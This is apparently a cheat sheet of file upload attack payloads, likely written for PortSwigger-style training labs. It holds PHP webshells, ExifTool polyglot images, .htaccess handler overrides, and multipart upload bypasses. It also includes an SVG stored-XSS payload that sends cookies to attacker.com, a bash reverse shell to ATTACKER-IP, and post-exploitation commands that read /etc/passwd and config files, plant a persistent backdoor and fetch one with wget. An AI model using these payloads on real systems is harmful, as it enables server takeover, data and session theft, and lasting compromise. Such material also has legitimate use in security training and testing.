# File Upload Vulnerabilities — Scripts

## PHP Webshells

### Read a specific file:
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

### Read a specific file and trim whitespace:
```php
<?php echo trim(file_get_contents('/home/carlos/secret')); ?>
```

### Full command execution webshell:
```php
<?php echo system($_GET['cmd']); ?>
```

### Usage in URL:
```
/files/avatars/shell.php?cmd=id
/files/avatars/shell.php?cmd=whoami
/files/avatars/shell.php?cmd=ls /home/carlos/
/files/avatars/shell.php?cmd=cat /home/carlos/secret
```

---

## ExifTool Commands

### Create polyglot file with file read payload:
```bash
exiftool -comment="<?php echo file_get_contents('/home/carlos/secret'); ?>" input.png -o shell.php
```

### Create polyglot file with command execution payload:
```bash
exiftool -comment="<?php echo system($_GET['cmd']); ?>" input.png -o shell.php
```

### Verify polyglot file:
```bash
exiftool shell.php
```
Check that:
- MIME Type = image/png
- Comment = your PHP code

### Check ExifTool version:
```bash
exiftool -ver
```

---

## .htaccess Payloads

### Make server execute .shell files as PHP:
```
AddType application/x-httpd-php .shell
```

### Make server execute .l33t files as PHP:
```
AddType application/x-httpd-php .l33t
```

### Make server execute .png files as PHP:
```
AddType application/x-httpd-php .png
```

---

## Burp Suite Request Templates

### Upload .htaccess via Burp Repeater:
```
------boundary
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .shell
------boundary
Content-Disposition: form-data; name="user"

wiener
------boundary
Content-Disposition: form-data; name="csrf"

YOUR_CSRF_TOKEN
------boundary--
```

### Upload webshell with custom extension:
```
------boundary
Content-Disposition: form-data; name="avatar"; filename="shell.shell"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>
------boundary
Content-Disposition: form-data; name="user"

wiener
------boundary
Content-Disposition: form-data; name="csrf"

YOUR_CSRF_TOKEN
------boundary--
```

### Bypass Content-Type validation:
```
------boundary
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>
------boundary--
```

### Path traversal in filename:
```
Content-Disposition: form-data; name="avatar"; filename="../shell.php"
```
```
Content-Disposition: form-data; name="avatar"; filename="..%2fshell.php"
```

### Null byte bypass:
```
Content-Disposition: form-data; name="avatar"; filename="shell.php%00.jpg"
```

---

## Stored XSS via SVG Upload:
```svg
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    document.location='http://attacker.com/steal?cookie='+document.cookie
  </script>
</svg>
```

---

## Cookie Stealing JavaScript:
```javascript
document.location='http://attacker.com/steal?cookie='+document.cookie
```

---

## Reverse Shell

### Set up listener on attacker machine:
```bash
nc -lvnp 4444
```

### Payload to execute on victim server:
```bash
bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1
```

### Via PHP webshell:
```
/files/avatars/shell.php?cmd=bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1
```

---

## PUT Method Upload:
```
PUT /images/exploit.php HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-httpd-php
Content-Length: 49

<?php echo file_get_contents('/home/carlos/secret'); ?>
```

### Check if PUT is supported:
```
OPTIONS / HTTP/1.1
Host: vulnerable-website.com
```
Look for `PUT` in the `Allow` response header.

---

## Reconnaissance Commands (via webshell)

### Find what user the server runs as:
```
?cmd=id
?cmd=whoami
```

### List users on the system:
```
?cmd=cat /etc/passwd
```

### Explore directories:
```
?cmd=ls /home/
?cmd=ls /home/carlos/
?cmd=ls /var/www/html/
```

### Read files:
```
?cmd=cat /home/carlos/secret
?cmd=cat /etc/passwd
?cmd=cat /var/www/html/config.php
```

### Make access permanent (copy shell):
```
?cmd=cp shell.php /var/www/html/backdoor.php
```

### Download backdoor from attacker server:
```
?cmd=wget http://attacker.com/backdoor.php -O /var/www/html/backdoor.php
```
